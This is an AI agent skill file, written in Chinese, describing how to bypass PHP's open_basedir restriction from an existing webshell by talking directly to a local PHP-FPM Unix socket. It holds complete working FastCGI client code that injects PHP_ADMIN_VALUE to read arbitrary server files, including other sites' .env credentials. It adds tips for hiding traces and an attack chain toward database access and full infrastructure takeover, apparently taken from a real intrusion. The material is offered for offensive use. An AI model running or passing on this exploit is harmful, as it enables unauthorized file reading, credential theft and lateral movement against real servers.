---
name: fpm-openbasedir-bypass
description: >-
  PHP-FPM Unix Socket 直连绕过 open_basedir 限制: 通过 stream_socket_client 连接本地
  FPM socket, 利用 PHP_ADMIN_VALUE 覆盖 open_basedir=/, 实现任意文件读取。
  disable_functions 的 ini 值可被清空但函数不会恢复（符号表级移除）。
  触发: open_basedir bypass, FPM bypass, FastCGI bypass, php-fpm绕过, unix socket,
  PHP_ADMIN_VALUE, open_basedir绕过, 读取任意文件, 服务器横向。
  实战来源: phpv4.88demo.cn (2026-09-23)
version: 1.0.0
author: 测绘引擎
metadata:
  source_ref: "phpv4-88demo 案卷 2026-09-23"
---

# PHP-FPM Unix Socket open_basedir Bypass (fpm-openbasedir-bypass)

## 一句话总结

> **`stream_socket_client('unix:///tmp/php-cgi-XX.sock')` + `PHP_ADMIN_VALUE: open_basedir=/`
> = 绕过 open_basedir，读取服务器任意文件。但 disable_functions 绕不了（符号表级移除）。**

## 适用场景

- 已有 PHP WebShell（可执行 PHP 代码）
- `open_basedir` 限制了文件读取范围（如 `/www/project/site/:/tmp/`）
- `stream_socket_client` 或 `fsockopen` **未被禁用**
- PHP-FPM 的 Unix Socket 在 `/tmp/` 或其他可访问路径下
- 目标：读取 open_basedir 外的文件（其他站点配置、/etc/passwd、宝塔面板等）

## 前提条件检查

```php
<?php
// 检查 1: stream_socket_client 是否可用
echo function_exists('stream_socket_client') ? "✅ stream_socket_client\n" : "❌ 不可用\n";

// 检查 2: 当前 open_basedir 限制
echo "open_basedir: " . ini_get('open_basedir') . "\n";

// 检查 3: 寻找 FPM socket 文件
$sockets = [
    '/tmp/php-cgi-74.sock',
    '/tmp/php-cgi-73.sock',
    '/tmp/php-cgi-80.sock',
    '/tmp/php-cgi-81.sock',
    '/tmp/php-cgi-82.sock',
    '/tmp/php-cgi-56.sock',
    '/run/php/php7.4-fpm.sock',
    '/run/php/php8.0-fpm.sock',
    '/var/run/php-fpm/www.sock',
    '/run/php-fpm/www.sock',
];
foreach($sockets as $s) {
    if(file_exists($s)) echo "✅ 找到 socket: $s\n";
}
// 宝塔面板标准路径: /tmp/php-cgi-{版本号前两位}.sock
// 如 PHP 7.4 → /tmp/php-cgi-74.sock

// 检查 4: 当前 UID（必须与 FPM worker 同用户才能连接）
echo "当前 UID: " . posix_getuid() . " (" . get_current_user() . ")\n";
?>
```

## 核心原理

### 为什么 open_basedir 能绕过

```
PHP 进程A（你的 webshell）:
  open_basedir = /www/project/phpv4/:/tmp/
  → 只能读这两个路径下的文件
  → 但 stream_socket_client 可以连接 /tmp/ 下的 socket ✅

PHP-FPM master 进程:
  → 接收 FastCGI 请求
  → fork 新 worker 处理
  → worker 的 open_basedir 由 FastCGI 参数 PHP_ADMIN_VALUE 决定

你发送 FastCGI 请求:
  PHP_ADMIN_VALUE: open_basedir=/
  SCRIPT_FILENAME: /tmp/your_script.php
  → FPM worker 启动时 open_basedir=/ → 可以读任意文件 ✅
```

### 为什么 disable_functions 绕不了

```
FPM master 启动时:
  1. 读取 php.ini + pool 配置
  2. 根据 disable_functions 列表，从 PHP 符号表中删除函数
  3. fork worker 进程

你通过 FastCGI 设置 PHP_ADMIN_VALUE: disable_functions=
  → ini 值确实被清空了（ini_get('disable_functions') 返回空）
  → 但函数已经从符号表移除了，不会恢复
  → exec() 仍然返回 "Call to undefined function"

关键区别:
  - open_basedir: 运行时检查（每次文件操作时检查），可以被 PHP_ADMIN_VALUE 覆盖
  - disable_functions: 启动时处理（从符号表删除），PHP_ADMIN_VALUE 改 ini 值但不恢复符号表
```

## 完整利用代码

### 步骤 1: 写目标脚本到 /tmp/

```php
<?php
// 你想在 FPM bypass 环境下执行的 PHP 代码
// 这个脚本将以 open_basedir=/ 运行
$target = '/www/project/other_site/.env';  // open_basedir 外的文件
if(file_exists($target)) {
    echo file_get_contents($target);
} else {
    echo "NOT FOUND: $target";
}
?>
```

通过你的 webshell 写入 `/tmp/fpm_target.php`（/tmp/ 在 open_basedir 内）。

### 步骤 2: FPM FastCGI 客户端

```php
<?php
error_reporting(0);

// ========== FastCGI 协议构造函数 ==========

function buildFcgiPacket($type, $content, $reqId = 1) {
    $clen = strlen($content);
    $pad = $clen % 8 ? 8 - $clen % 8 : 0;
    // FCGI header: version(1) + type(1) + requestId(2) + contentLength(2) + paddingLength(1) + reserved(1)
    return pack('CCnnCx', 1, $type, $reqId, $clen, $pad) . str_pad($content, $clen + $pad, "\0");
}

function buildNVPair($name, $value) {
    $nlen = strlen($name);
    $vlen = strlen($value);
    $r = '';
    $r .= $nlen < 128 ? chr($nlen) : pack('N', $nlen | 0x80000000);
    $r .= $vlen < 128 ? chr($vlen) : pack('N', $vlen | 0x80000000);
    return $r . $name . $value;
}

// ========== 配置 ==========

$socket_path = '/tmp/php-cgi-74.sock';  // 根据 PHP 版本调整
$script      = '/tmp/fpm_target.php';   // 要执行的脚本
$override    = "disable_functions=\nopen_basedir=/";  // 关键！

// ========== 连接 ==========

$sock = stream_socket_client("unix://$socket_path", $errno, $errstr, 5);
if (!$sock) {
    echo "SOCK_ERR: $errstr ($errno)";
    exit;
}

// ========== 构造请求 ==========

// FCGI_BEGIN_REQUEST (type=1): role=RESPONDER(1), flags=0
// ⚠️ 必须是 8 字节！用 pack('nCx5', 1, 0) 而不是 pack('nC5', 1, 0,0,0,0,0,0)
$begin = pack('nCx5', 1, 0);

$params  = buildNVPair('SCRIPT_FILENAME', $script);
$params .= buildNVPair('REQUEST_METHOD', 'GET');
$params .= buildNVPair('SERVER_NAME', 'localhost');
$params .= buildNVPair('PHP_ADMIN_VALUE', $override);  // 覆盖 open_basedir

// ========== 发送 ==========

fwrite($sock, buildFcgiPacket(1, $begin));   // FCGI_BEGIN_REQUEST
fwrite($sock, buildFcgiPacket(4, $params));  // FCGI_PARAMS
fwrite($sock, buildFcgiPacket(4, ''));       // FCGI_PARAMS (空 = 结束)
fwrite($sock, buildFcgiPacket(5, ''));       // FCGI_STDIN (空 = 无 POST body)

// ========== 接收 ==========

$output = '';
while (!feof($sock)) {
    $header = fread($sock, 8);
    if (strlen($header) < 8) break;

    $data = unpack('Cversion/Ctype/nrequestId/ncontentLength/CpaddingLength', $header);
    $body = '';

    if ($data['contentLength'] > 0) {
        $body = fread($sock, $data['contentLength']);
    }
    if ($data['paddingLength'] > 0) {
        fread($sock, $data['paddingLength']);  // 丢弃 padding
    }

    if ($data['type'] == 6) $output .= $body;  // FCGI_STDOUT
    if ($data['type'] == 3) break;              // FCGI_END_REQUEST
}
fclose($sock);

// 去掉 HTTP 响应头
$pos = strpos($output, "\r\n\r\n");
echo $pos !== false ? substr($output, $pos + 4) : $output;
?>
```

### 步骤 3: 执行

通过 webshell 访问 FPM 客户端脚本。它会：
1. 连接 FPM Unix Socket
2. 请求执行 `/tmp/fpm_target.php`
3. FPM worker 以 `open_basedir=/` 启动
4. 脚本可以读取任意路径的文件
5. 结果通过 FCGI_STDOUT 返回

## 实战坑记录

### 坑 1: FCGI_BEGIN_REQUEST 必须 8 字节

```
❌ 错误: pack('nC5', 1, 0, 0, 0, 0, 0, 0)
   → 产生 7 字节 (n=2 + C×5=5 = 7)
   → FPM 返回 rawlen=0 错误

✅ 正确: pack('nCx5', 1, 0)
   → 产生 8 字节 (n=2 + C=1 + x5=5 = 8)
   → x 是 NUL 填充字节

说明: n=unsigned short (2字节, role=RESPONDER=1)
     C=unsigned char (1字节, flags=0)
     x5=5个NUL字节 (reserved, 填充到8字节)
```

### 坑 2: disable_functions 不会恢复

```
现象: PHP_ADMIN_VALUE 设置 disable_functions= 后
     ini_get('disable_functions') 确实返回空字符串
     但 exec('id') 仍然 "Call to undefined function exec()"

原因: FPM master 在启动时就把被禁函数从 zend_function_table 删除了
     改 ini 值只影响 ini_get() 的返回，不会把函数加回符号表
     这跟 open_basedir 的机制完全不同

教训: 不要在恢复 disable_functions 上浪费时间
     open_basedir=/ 已经够用了（能读任意文件）
     真正需要命令执行时，找其他路径（提权/cron/SUID）
```

### 坑 3: socket 路径与 PHP 版本对应

```
宝塔面板标准:
  PHP 5.6 → /tmp/php-cgi-56.sock
  PHP 7.0 → /tmp/php-cgi-70.sock
  PHP 7.4 → /tmp/php-cgi-74.sock
  PHP 8.0 → /tmp/php-cgi-80.sock
  PHP 8.2 → /tmp/php-cgi-82.sock

Ubuntu/Debian:
  /run/php/php7.4-fpm.sock
  /run/php/php8.0-fpm.sock

CentOS/RHEL:
  /var/run/php-fpm/www.sock

确定方法: ls /tmp/*.sock 或读 PHP-FPM pool 配置
```

### 坑 4: /tmp/ 脚本的生命周期管理

```
问题: /tmp/ 下的 PHP 脚本会被系统自动清理（systemd-tmpfiles）
     或者被其他用户读到

最佳实践:
  1. 脚本用完立刻 @unlink(__FILE__) 自毁
  2. 或者在脚本末尾加 @unlink(__FILE__)
  3. FPM 客户端脚本也要自毁
  4. 不要在 /tmp/ 放长期后门
```

### 坑 5: 同 UID 才能连接 socket

```
条件: webshell 的 UID 必须与 FPM worker 相同（通常都是 www/www-data）
     或者 socket 文件权限设置为 0666（任何用户可连接）

验证: 
  echo posix_getuid();         // 你的 UID
  stat /tmp/php-cgi-74.sock    // socket 的 owner
  
  如果不匹配 → 连接被拒 → 需要找其他方法
```

## 与其他 Skill 的关系

| 场景 | 走哪个 Skill |
|------|-------------|
| disable_functions 受限但 open_basedir 不限 | `php-disable-functions-ops`（不需要 FPM bypass） |
| open_basedir 受限 + 有 FPM socket | **本 Skill**（FPM bypass） |
| open_basedir 受限 + 无 FPM socket | 找其他路径（symlink/procfs/SplFileInfo） |
| 需要持久化后门 | `webshell-stealth-persistence`（先用本 Skill 读取目录结构） |
| 需要横向穿透到同服其他站 | 本 Skill 读其他站 .env → 拿凭据 → 横向 |

## 组合链路

```
FPM bypass (本 Skill)
  → 读取同服其他项目 .env
  → 拿到 MySQL root 密码
  → 连接所有数据库
  → 读取 docker-compose.yml (发现 MongoDB 无认证)
  → 横向到 IM/博彩/客服系统
  → 完成全基础设施接管
```

## 快速判断流程图

```
有 webshell?
  ├─ No → 先拿 shell
  └─ Yes → open_basedir 限制了你?
       ├─ No → 直接读文件，不需要本 Skill
       └─ Yes → stream_socket_client 可用?
            ├─ No → 找其他 bypass（symlink/procfs）
            └─ Yes → /tmp/ 下有 .sock?
                 ├─ No → 搜索其他 socket 路径
                 └─ Yes → UID 匹配?
                      ├─ No → socket 权限允许? 否则找其他路径
                      └─ Yes → 🎯 使用本 Skill 的 FPM bypass！
```
